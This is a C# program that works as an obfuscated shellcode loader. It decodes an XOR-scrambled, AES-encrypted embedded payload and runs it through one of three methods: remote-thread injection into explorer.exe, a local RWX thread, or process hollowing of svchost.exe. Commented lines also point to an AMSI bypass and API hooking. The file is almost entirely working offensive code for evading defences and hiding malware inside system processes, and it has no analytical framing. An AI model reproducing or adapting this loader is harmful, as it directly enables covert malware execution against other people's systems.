using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using System.IO;


namespace hidden_test
{
    class Program
    {


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO { public Int32 cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle; public Int32 dwX; public Int32 dwY; public Int32 dwXSize; public Int32 dwYSize; public Int32 dwXCountChars; public Int32 dwYCountChars; public Int32 dwFillAttribute; public Int32 dwFlags; public Int16 wShowWindow; public Int16 cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1; public IntPtr PebAddress; public IntPtr Reserved2; public IntPtr Reserved3; public IntPtr UniquePid; public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);



        static byte[] AESDecryptBytes(byte[] cryptBytes, byte[] passBytes, byte[] saltBytes)
        {
            byte[] clearBytes = null;

            // create a key from the password and salt, use 32K iterations
            var key = new Rfc2898DeriveBytes(passBytes, saltBytes, 32768);

            using (Aes aes = new AesManaged())
            {
                // set the key size to 256
                aes.KeySize = 256;
                aes.Key = key.GetBytes(aes.KeySize / 8);
                aes.IV = key.GetBytes(aes.BlockSize / 8);
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cryptBytes, 0, cryptBytes.Length);
                        cs.Close();
                    }
                    clearBytes = ms.ToArray();
                }
            }
            return clearBytes;
        }

        public static byte[] ExtractResource(String filename)
        {
            System.Reflection.Assembly a = System.Reflection.Assembly.GetExecutingAssembly();
            using (Stream resFilestream = a.GetManifestResourceStream(filename))
            {
                if (resFilestream == null) return null;
                byte[] ba = new byte[resFilestream.Length];
                resFilestream.Read(ba, 0, ba.Length);
                return ba;
            }
        }


        static void Main(string[] args)
        {

            byte[] startcode = Properties.Resources.temp;

            //XOR
            Int32 key = 93252512;
            for (int i = 0; i < startcode.Length; i++)
            {
                startcode[i] = (byte)(((uint)startcode[i] ^ (key + i)) & 0xFF);
            }


            for (int i = 0; i < startcode.Length; i++)
            {
                startcode[i] = (byte)(((uint)startcode[i] - (i & 0xFF)) & 0xFF);
            }


            byte[] passBytes = Encoding.UTF8.GetBytes("This is the pass");
            byte[] saltBytes = Encoding.UTF8.GetBytes("This is the salt");
            byte[] result = AESDecryptBytes(startcode, passBytes, saltBytes);

            int size = result.Length;
            //Console.WriteLine("DEBUG:: " + size);
            //DEBUG
            //StringBuilder hex = new StringBuilder(result.Length * 2);
            //var each_line = 15;
            //var total_length = 0;

            //foreach (byte b in result)
            //{
            //    hex.AppendFormat("0x{0:x2},", b);
            //    each_line = each_line - 1;
            //    total_length = total_length + 1;
            //    if (each_line == 0)
            //    {
            //        hex.Append("\n");
            //        each_line = 15;
            //    }

            //}

            //Console.WriteLine("The payload (" + total_length + ") is:\n" + hex.ToString());

            if (args[0] == "1")
            {
                //try inject
                Process[] expProc = Process.GetProcessesByName("explorer");
                int pid = expProc[0].Id;
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid); //PROCESS_ALL_ACCESS (0x001F0FFF) //dwProcessId == 4804 //bInheritHandle for child process

                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x10000, 0x3000, 0x40); //PAGE_EXECUTE_READWRITE (0x40) //IntPtr.Zero == null, auto //MEM_COMMIT and MEM_RESERVE (0x3000)
                IntPtr outSize;
                WriteProcessMemory(hProcess, addr, result, result.Length, out outSize);
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
            else if (args[0] == "2")
            {
                //chain AMSI bypass
                //Amsi.Bypass();
                //behavior hook
                //CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle(L"KERNELBASE.dll"), "CreateProcessInternalW");
                //CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateProcessInternalW");
                //hookResult = installHook(CreateProcessInternalW, hookCreateProcessInternalW, 5);

                //start thread
                IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x10000, 0x3000, 0x40);
                Marshal.Copy(result, 0, addr, size);
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                Console.WriteLine("Started ...");
                WaitForSingleObject(hThread, 0xFFFF);
                Console.WriteLine("Exited ...");

            }
            else if (args[0] == "3")
            {
                //hollowing
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

                PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
                uint tmp = 0;
                IntPtr hProcess = pi.hProcess;
                ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

                IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

                byte[] addrBuf = new byte[IntPtr.Size];
                IntPtr nRead = IntPtr.Zero;
                ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

                IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
                byte[] data = new byte[0x200];

                ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

                uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
                uint opthdr = e_lfanew_offset + 0x28;
                uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
                IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

                WriteProcessMemory(hProcess, addressOfEntryPoint, result, result.Length, out nRead);
                ResumeThread(pi.hThread);


            }
        }
    }
}


